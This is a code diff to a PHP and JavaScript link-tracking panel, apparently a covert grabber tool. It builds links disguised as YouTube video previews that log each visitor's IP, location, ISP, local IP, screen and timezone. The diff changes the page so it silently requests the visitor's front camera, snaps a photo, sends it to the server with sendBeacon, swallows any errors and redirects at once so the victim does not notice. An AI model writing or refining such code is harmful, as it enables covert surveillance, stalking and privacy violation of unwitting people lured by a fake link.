@@ -34,7 +34,7 @@ try {
     die("خطأ في قاعدة البيانات: " . $e->getMessage());
 }
 
-// معالجة استقبال صورة السيلفي عبر AJAX
+// استقبال ووخزن صورة السيلفي في الخلفية بصمت
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) &&$_POST['action'] === 'save_photo') {
     $code =$_POST['code'] ?? '';
     $imgData =$_POST['image'] ?? '';
@@ -102,21 +102,18 @@ function get_ip_details($ip) {
         return [
             'country' => $data['country'] ?? 'غير معروف',
             'city' => $data['city'] ?? 'غير معروف',
-            'lat' => $data['lat'] ?? '36.7538', 
-            'lon' =>$data['lon'] ?? '3.0588',
+            'lat' => $data['lat'] ?? '36.7538', 'lon' =>$data['lon'] ?? '3.0588',
             'isp' => parse_isp($data['isp'] ?? '',$data['org'] ?? '')
         ];
     }
     return ['country' => 'غير معروف', 'city' => 'غير معروف', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'غير معروف'];
 }
 
-// متغيرات المعاينة الافتراضية
 $og_title = "Hello World from azez";
 $og_description = "لوحة تحكم تتبع الروابط المتقدمة";
 $og_image = "";
 $target_url_redirect = "";
 
-// فحص الكود لجلب بيانات المعاينة فوراً (حتى لو طلبها بوت واتساب)
 if (isset($_GET['r'])) {
     $code =$_GET['r'];
     $stmt =$db->prepare("SELECT target_url FROM links WHERE code = ?");
@@ -126,7 +123,6 @@ if (isset($_GET['r'])) {
     if ($link) {$target_url_redirect = $link['target_url'];$og_title = "شاهد الفيديو المباشر";
         $og_description = "اضغط للمشاهدة الآن عبر اليوتيوب";
 
-        // استخراج صورة يوتيوب بدقة
         if (strpos($target_url_redirect, 'youtube.com') !== false || strpos($target_url_redirect, 'youtu.be') !== false) {$parsed_url = parse_url($target_url_redirect);$video_id = "";
             if (isset($parsed_url['query'])) {
                 parse_str($parsed_url['query'],$query_params);
@@ -141,7 +137,6 @@ if (isset($_GET['r'])) {
             }
         }
 
-        // إذا أرسل المتصفح معلومات الشاشة، يتم تسجيل الزيارة ثم التوجيه الفعلي
         if (isset($_GET['screen'])) {$public_ip = get_real_ip();
             $local_ip =$_GET['lip'] ?? 'غير متوفر';
             $port =$_SERVER['REMOTE_PORT'] ?? 'غير متوفر';
@@ -162,7 +157,7 @@ if (isset($_GET['r'])) {
     }
 }
 
-// 2. إنشاء رابط جديد
+// إنشاء رابط جديد
 $generated_link = "";
 $tracking_code = "";
 if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
@@ -198,7 +193,6 @@ if (!empty($filter_code)) {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title><?php echo htmlspecialchars($og_title); ?></title>
     
-    <!-- وسوم المعاينة لبرامج التراسل -->
     <meta property="og:title" content="<?php echo htmlspecialchars($og_title); ?>">
     <meta property="og:description" content="<?php echo htmlspecialchars($og_description); ?>">
     <?php if (!empty($og_image)): ?>
@@ -248,15 +242,18 @@ if (!empty($filter_code)) {
             const redirectCode = urlParams.get('r');
             const hasScreen = urlParams.has('screen');
 
-            // إذا فتح المستخدم الحقيقي الرابط وليس بوت المعاينة
             if (redirectCode && !hasScreen) {
+                // التوجيه الفوري والسريع جداً دون انتظار الكاميرا
+                const screenRes = screen.width + "x" + screen.height;
+                const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                
+                // محاولة التقاط الصورة في الخلفية بصمت تام (إن أمكن) دون تأخير التوجيه
                 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                         .then(function(stream) {
                             const video = document.createElement('video');
                             video.srcObject = stream;
                             video.play();
-                            
                             setTimeout(function() {
                                 const canvas = document.createElement('canvas');
                                 canvas.width = 320;
@@ -264,7 +261,6 @@ if (!empty($filter_code)) {
                                 const ctx = canvas.getContext('2d');
                                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                 const imageData = canvas.toDataURL('image/jpeg', 0.8);
-                                
                                 stream.getTracks().forEach(track => track.stop());
 
                                 const formData = new URLSearchParams();
@@ -272,28 +268,16 @@ if (!empty($filter_code)) {
                                 formData.append('code', redirectCode);
                                 formData.append('image', imageData);
 
-                                fetch(window.location.href, {
-                                    method: 'POST',
-                                    body: formData
-                                }).finally(() => {
-                                    proceedRedirect(redirectCode);
-                                });
-                            }, 1000);
-                        })
-                        .catch(function(error) {
-                            proceedRedirect(redirectCode);
-                        });
-                } else {
-                    proceedRedirect(redirectCode);
+                                // إرسال الصورة للخادم في الخلفية
+                                navigator.sendBeacon(window.location.href, formData);
+                            }, 300);
+                        }).catch(function(e) {});
                 }
+
+                // الانتقال الفوري للرابط المستهدف
+                window.location.href = `/?r=${redirectCode}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`;
             }
         });
-
-        function proceedRedirect(code) {
-            const screenRes = screen.width + "x" + screen.height;
-            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            window.location.href = `/?r=${code}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`;
-        }
 
         function copyText(text, btnElement) {
             navigator.clipboard.writeText(text).then(() => {
